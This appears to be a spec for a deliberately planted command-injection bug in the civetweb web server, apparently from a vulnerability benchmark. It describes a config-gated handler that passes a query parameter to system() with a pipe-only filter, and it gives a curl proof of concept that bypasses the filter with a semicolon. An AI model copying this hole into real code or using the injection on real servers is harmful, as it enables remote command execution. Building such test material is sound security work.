DESCRIPTION:
  Config-file-gated command injection in civetweb standalone server.
  The cmd parameter is wrapped in "sh -c '...' 2>/dev/null" (I2). A pipe-
  character filter (S2) is bypassed with semicolon.

CONFIG_GATE (C2 -- config file):
  mechanism:  Key=value config file parsed by read_exec_config() into
              exec_cfg {enabled, logging}. prescan_exec_args() strips
              --config PATH from argv before civetweb's parser.
  check:      exec_handler() returns 404 unless exec_cfg.enabled && exec_cfg.logging
  complexity: requires modelling fopen->fgets->sscanf data flow into struct fields

INPUT_FLOW (I2 -- buffered):
  entry:      HTTP GET /exec?cmd=<payload>  ->  ri->query_string
  path:       exec_handler() snprintf(shell_cmd, ..., "sh -c '%s' 2>/dev/null", qs+4)
              system(shell_cmd)
  transforms: one snprintf buffer wrapping in sh -c

SANITIZATION (S2 -- pipe blocked, bypass with semicolon):
  mechanism:  loop over qs+4 chars, reject '|' with 403
  bypass:     use ';' for command chaining

SINK:        system(shell_cmd) in exec_handler() (src/main.c)

CHANGED FILES:
  src/main.c -- 4 hunks:
    1. globals:  added exec_cfg struct + read_exec_config() after g_exit_flag
    2. handler:  new exec_handler() with I2 flow and S2 sanitization
    3. prescan:  prescan_exec_args() strips --config PATH
    4. start:    prescan call + mg_set_request_handler() registration

EXPLOIT:
  build:   bash build.sh
  start:   ./civetweb --config /tmp/poc_148.conf -listening_ports 18148 -document_root /tmp
  config:  exec_mode = 1\nexec_logging = 1
  trigger: curl 'http://127.0.0.1:18148/exec?cmd=id;id>/tmp/poc_148_marker'
  verify:  cat /tmp/poc_148_marker
  bypass:  semicolon bypasses the pipe-only S2 filter

  gate bypass: omitting --config leaves exec_cfg.enabled=0; /exec returns 404.

NOTES:
  system() output goes to server stderr; use write-to-file payloads.
  I2 wraps cmd in "sh -c '%s' 2>/dev/null"; payload must not contain single quotes.
